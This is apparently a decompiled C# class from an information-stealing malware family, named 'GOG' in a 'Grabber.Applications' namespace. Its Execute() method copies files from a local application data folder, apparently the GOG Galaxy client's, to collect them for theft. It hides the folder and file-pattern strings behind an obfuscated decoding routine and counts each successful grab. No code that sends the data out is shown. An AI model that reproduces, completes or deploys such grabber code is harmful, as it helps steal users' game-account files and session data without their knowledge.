using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;

namespace Application.Grabber.Applications
{
	// Token: 0x0200003A RID: 58
	internal class GOG
	{
		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060001EC RID: 492 RVA: 0x0000D2DC File Offset: 0x0000B4DC
		// (set) Token: 0x060001ED RID: 493 RVA: 0x0000D2F0 File Offset: 0x0000B4F0
		public static int Count { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x060001EE RID: 494 RVA: 0x0000D304 File Offset: 0x0000B504
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static List<FileObject> Execute()
		{
			List<FileObject> list = new List<FileObject>();
			list.AddRange(Helper.CopyAll(delegate0d0.f0000ba(Paths.LocalDataPath, c0000c0.m00000f("ÍF\u0002#\u0088\n\\Zð5/@iï4;Õí\0\0D£oß2Ê\u001e±y")), c0000c0.m00000f("Ðq=\bÏ\nRCÅ\u001d _TÐ\u0002 "), c0000c0.m00000f("òn#\u0002Ï\u000e\u001d]ß\u001d "), SearchOption.TopDirectoryOnly));
			if (list.Count > 0)
			{
				GOG.Count++;
			}
			return list;
		}

		// Token: 0x060001EF RID: 495 RVA: 0x0000D364 File Offset: 0x0000B564
		[MethodImpl(MethodImplOptions.NoInlining)]
		public GOG()
		{
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x0000D36C File Offset: 0x0000B56C
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static GOG()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x0400009A RID: 154
		[CompilerGenerated]
		private static int f00001a;
	}
}
